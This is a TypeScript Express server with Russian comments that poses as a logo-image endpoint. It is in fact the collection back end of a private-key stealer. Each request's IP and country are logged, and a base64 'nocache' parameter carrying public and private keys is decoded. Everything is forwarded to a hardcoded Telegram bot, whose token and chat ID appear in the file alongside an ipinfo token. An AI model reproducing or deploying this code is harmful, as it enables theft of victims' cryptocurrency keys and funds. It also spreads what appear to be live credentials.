import express from 'express';
import axios from 'axios';
import { Buffer } from 'buffer';
import { ParsedUrlQuery } from 'querystring';

const app = express();

// Включаем доверие к прокси (важно для Vercel)
app.set('trust proxy', true);

// Конфигурация Telegram
const TELEGRAM_BOT_TOKEN = '7283726243:AAFW3mIA1SzOmyftdqiRv8xTxtAmyk1rLmw';
const TELEGRAM_CHAT_ID = '5018443124';
const IPINFO_TOKEN = '717875db282daa'; // Получите на ipinfo.io

const LOGO_BASE64 = 'iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4AkEEjUXUBJp+AAAAB1pVFh0Q29tbWVudAAAAAAAQ3JlYXRlZCB3aXRoIEdJTVBkLmUHAAAAK0lEQVQ4y2NgGAWjYBSMglEwCkbBKBgM4H8Q8p+BgYGB8X8Q0jQKRgEAGY0BCS1Xw/MAAAAASUVORK5CYII=';

// Middleware для обработки CORS
app.use((req, res, next) => {
  // Разрешаем запросы с любых источников (можно заменить на конкретный домен)
  res.setHeader('Access-Control-Allow-Origin', '*');
  
  // Разрешаем необходимые методы
  res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');
  
  // Разрешаем необходимые заголовки
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  
  // Продолжаем обработку запроса
  next();
});

// Обработчик OPTIONS для предварительных запросов
app.options('/', (req, res) => {
  res.status(200).end();
});
// Обработчик GET запросов
app.get('/', async (req, res) => {
  try {
    // Получаем реальный IP пользователя
    // @ts-ignore
    const userIp = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
                  req.socket?.remoteAddress || 
                  req.connection?.remoteAddress || 
                  req.ip;
    
    // Получаем страну по IP
    const country = await getCountryByIp(userIp);
    
    // Дешифруем данные nocache
    const decryptedData = await decryptNocache(req.query.nocache);
    
    console.log('GET request from:', userIp, 'Country:', country, 'Data:', req.query);

    // Отправляем данные в Telegram (асинхронно, не ждем завершения)
    await sendToTelegram(userIp, country, decryptedData);

    // Отправляем изображение
    const imageBuffer = Buffer.from(LOGO_BASE64, 'base64');
    res.setHeader('Content-Type', 'image/png');
    res.setHeader('Content-Length', imageBuffer.length);
    res.setHeader('Cache-Control', 'no-store, max-age=0');
    res.status(200).send(imageBuffer);

  } catch (error) {
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: `ОШИБКА в мэйне: ${error}`,
      parse_mode: 'Markdown'
    });
    res.status(500).send('Internal Server Error');
  }
});

// Функция дешифровки данных nocache
async function decryptNocache(nocache: any) {
  if (!nocache) return null;
  
  try {
    // Декодируем Base64
    const decoded = Buffer.from(nocache, 'base64').toString('utf-8');
    
    // Парсим JSON
    const data = JSON.parse(decoded);
    
    return {
      timestamp: data.timestamp ? new Date(data.timestamp * 1000).toISOString() : null,
      header: data.header,
      keys: data.keys || []
    };
  } catch (error) {
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: `ОШИБКА при декрипте: ${error}`,
      parse_mode: 'Markdown'
    });
    return { error: 'Failed to decrypt data' };
  }
}

// Функция получения страны по IP
async function getCountryByIp(ip: any) {
  if (!ip || ip === '::1' || ip === '127.0.0.1') return 'Local';
  
  try {
    const response = await axios.get(`https://ipinfo.io/${ip}/json?token=${IPINFO_TOKEN}`);
    return response.data.country || 'Unknown';
  } catch (error) {
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: `ОШИБКА при получение страны: ${error}`,
      parse_mode: 'Markdown'
    });
    return 'Error';
  }
}

// Функция отправки в Telegram
async function sendToTelegram(
  ip: string,
  country: string,
  decryptedData: {
    timestamp?: string | null;
    header?: string;
    keys?: Array<{ public?: string; private?: string }>;
    error?: string;
  } | null
) {
  try {
    // Базовое сообщение
    let message = `🌐 *Новый запрос логотипа*\n\n`;
    message += `🖥️ *IP*: \`${ip}\`\n`;
    message += `📍 *Страна*: ${country}\n\n`;

    // Добавляем расшифрованные данные, если они есть
    if (decryptedData) {
      if (decryptedData.error) {
        message += `❌ *Ошибка расшифровки*: \`${decryptedData.error}\`\n`;
      } else {
        // Добавляем заголовок, если есть
        if (decryptedData.header) {
          message += `📋 *Заголовок*: \`${decryptedData.header}\`\n\n`;
        }

        // Добавляем timestamp, если есть
        if (decryptedData.timestamp) {
          message += `⏱️ *Время запроса*: \`${decryptedData.timestamp}\`\n\n`;
        }

        // Добавляем ключи, если есть
        if (decryptedData.keys && decryptedData.keys.length > 0) {
          message += `🔑 *Ключи (${decryptedData.keys.length})*:\n`;
          
          decryptedData.keys.forEach((key, index) => {
            message += `\n*Ключ ${index + 1}*:\n`;
            message += `▫️ *Публичный*: \`${key.public || 'отсутствует'}\`\n`;
            message += `▫️ *Приватный*: \`${key.private ? key.private : 'отсутствует'}\`\n`;
          });
        }
      }
    } else {
      message += `ℹ️ *Нет данных для отображения*\n`;
    }

    // Отправляем сообщение в Telegram
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: 'Markdown'
    });

  } catch (error) {
    console.error('Ошибка при отправке в Telegram:', error);
    
    // Пытаемся отправить сообщение об ошибке
    try {
      await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        chat_id: TELEGRAM_CHAT_ID,
        text: `❌ *Ошибка при отправке данных*:\n\`${error instanceof Error ? error.message : String(error)}\``,
        parse_mode: 'Markdown'
      });
    } catch (secondaryError) {
      console.error('Не удалось отправить сообщение об ошибке:', secondaryError);
    }
  }
}

export default app;